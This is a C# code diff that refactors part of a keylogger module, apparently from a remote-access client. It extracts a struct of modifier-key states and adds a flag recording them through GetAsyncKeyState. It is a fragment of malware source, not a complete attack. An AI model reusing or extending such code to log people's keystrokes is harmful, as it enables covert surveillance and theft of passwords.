@@ -12,29 +12,44 @@ using System.Text;
 namespace xClient.Core.Keylogger
 {
     /// <summary>
+    /// A data type that is used for storing values regarding the states of
+    /// modifier keys at a given time.
+    /// </summary>
+    public struct KeyloggerModifierKeys
+    {
+        public bool ShiftKeyPressed { get; set; }
+        public bool AltKeyPressed { get; set; }
+        public bool CtrlKeyPressed { get; set; }
+
+        public bool CapsLock { get; set; }
+        public bool NumLock { get; set; }
+        public bool ScrollLock { get; set; }
+    }
+
+    /// <summary>
     /// The main object that stores both the pressed key at a specific time
     /// and the modifier keys that go along with the pressed key.
     /// </summary>
     public class LoggedKey
     {
         /// <summary>
-        /// A data type that is used for storing values regarding the states of
-        /// modifier keys at a given time.
+        /// Gets the key that was pressed.
         /// </summary>
-        public struct KeyloggerModifierKeys
-        {
-            public bool ShiftKeyPressed { get; set; }
-            public bool AltKeyPressed { get; set; }
-            public bool CtrlKeyPressed { get; set; }
-
-            public bool CapsLock { get; set; }
-            public bool NumLock { get; set; }
-            public bool ScrollLock { get; set; }
-        }
-
         public KeyloggerKeys PressedKey { get; set; }
+        /// <summary>
+        /// An object with the purpose of storing the states of modifier keys.
+        /// </summary>
         public KeyloggerModifierKeys ModifierKeys { get; private set; }
+        /// <summary>
+        /// Determines if one of the modifier keys (excluding shift and caps
+        /// lock) has been set.
+        /// </summary>
+        public bool ModifierKeysSet { get; private set; }
 
+        /// <summary>
+        /// Sets the values of the modifier key states at the time
+        /// that this method was called.
+        /// </summary>
         public void RecordModifierKeys()
         {
             ModifierKeys = new KeyloggerModifierKeys()
@@ -48,6 +63,12 @@ namespace xClient.Core.Keylogger
                 NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
                 ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled()
             };
+
+            // To avoid having to repeatedly check if one of the modifier
+            // keys (besides shift and caps lock) was set, just simply
+            // decide and then store it right here.
+            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed ||
+                               ModifierKeys.NumLock        || ModifierKeys.ScrollLock);
         }
     }
 
